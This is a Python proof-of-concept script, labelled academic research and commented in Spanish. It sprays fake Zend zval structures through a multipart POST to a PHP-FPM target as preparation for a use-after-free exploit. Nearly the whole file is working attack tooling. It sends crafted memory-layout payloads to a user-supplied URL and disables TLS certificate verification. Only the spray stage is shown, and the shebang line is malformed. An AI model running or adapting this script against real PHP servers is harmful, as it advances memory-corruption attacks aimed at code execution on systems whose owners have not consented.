#!/usr/init/env python3
"""
PHP2SHELL Research PoC - Zval Structure Sprayer & UAF Preparation
Author: Research Lab / Academic Context
Target: Local PHP-FPM Engine (Zend Engine Memory Layout)
"""

import socket
import ssl
import sys
from urllib.parse import urlparse

def build_zval_mimic_payload():
    """
    Construye una estructura de bytes que imita la cabecera y el valor 
    de un zval de PHP en memoria (tipo + u1 + u2).
    Esto permite que, al reutilizar el bloque huérfano, el motor interprete
    nuestros datos controlados como un objeto o array válido.
    
    Estructura estándar de _zval_struct en C (x86_64):
    - zend_value value;     // 8 bytes (puntero o valor escalar)
    - union { ... } u1;     // 4 bytes (tipo de dato, banderas)
    - union { ... } u2;     // 4 bytes (gc_info / refcount)
    Total: 16 bytes por ranura de zval.
    """
    # Marcador de valor controlado (ej: puntero falso o entero 0xdeadbeef...)
    fake_value = b"\xef\xbe\xad\xde\x00\x00\x00\x00"  # 8 bytes
    
    # Marcador de tipo (ej: IS_STRING o IS_OBJECT) y banderas de control del motor
    fake_u1_u2 = b"\x07\x00\x00\x00\x01\x00\x00\x00"  # 8 bytes
    
    zval_entry = fake_value + fake_u1_u2
    
    # Multiplicamos la estructura para realizar un spray estructural en el heap
    return zval_entry * 256

def send_zval_spray(target_url):
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'

    payload = build_zval_mimic_payload()
    
    boundary = "----------------FormBoundaryZvalSpray"
    
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"data_stream\"; filename=\"spray.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode('latin1') + payload + f"\r\n--{boundary}--\r\n".encode('latin1')

    http_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n"
        f"Cookie: PHPSESSID=research_session_01\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode('latin1') + body

    print(f"[*] Conectando para inyectar spray estructural de Zvals en {host}:{port}...")
    
    if parsed.scheme == 'https':
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s.sendall(http_request)
    
    response = s.recv(4096)
    print(f"[+] Respuesta recibida tras el spray estructural ({len(response)} bytes).")
    s.close()

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/index.php"
    send_zval_spray(target)
